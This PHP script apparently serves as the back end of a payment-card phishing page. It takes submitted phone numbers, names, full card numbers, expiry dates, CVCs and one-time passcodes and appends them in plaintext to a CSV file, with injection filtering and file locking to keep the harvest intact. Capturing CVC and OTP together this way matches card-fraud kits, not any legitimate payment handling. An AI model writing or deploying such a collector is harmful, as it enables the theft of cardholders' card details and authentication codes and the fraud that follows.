<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = __DIR__ . '/data.csv';

    /**
     * Sanitize a value before writing it to CSV to mitigate CSV injection and
     * remove line-breaks that would corrupt the file structure.
     */
    $sanitize = static function (string $value): string {
        // Trim leading/trailing white-space
        $value = trim($value);
        // Prevent CSV/Formula injection when opened in spreadsheet software
        if (preg_match('/^[\=\+\-@]/', $value)) {
            $value = "'" . $value; // prepend apostrophe so it is treated as text
        }
        // Remove any newlines to keep CSV one-record-per-line
        return str_replace(["\r", "\n"], ' ', $value);
    };

    $data = [
        date('Y-m-d H:i:s'),
        $sanitize($_POST['phone'] ?? ''),
        $sanitize($_POST['amount'] ?? ''),
        $sanitize($_POST['name'] ?? ''),
        $sanitize($_POST['card_number'] ?? ''),
        $sanitize($_POST['expiry'] ?? ''),
        $sanitize($_POST['cvc'] ?? ''),
        $sanitize($_POST['otp'] ?? '')
    ];

    if (($fp = fopen($file, 'a')) !== false) {
        // Obtain an exclusive lock so parallel requests don’t corrupt the file
        if (flock($fp, LOCK_EX)) {
            fputcsv($fp, $data);
            flock($fp, LOCK_UN);
        }
        fclose($fp);
    }

    echo 'success';
}
?>
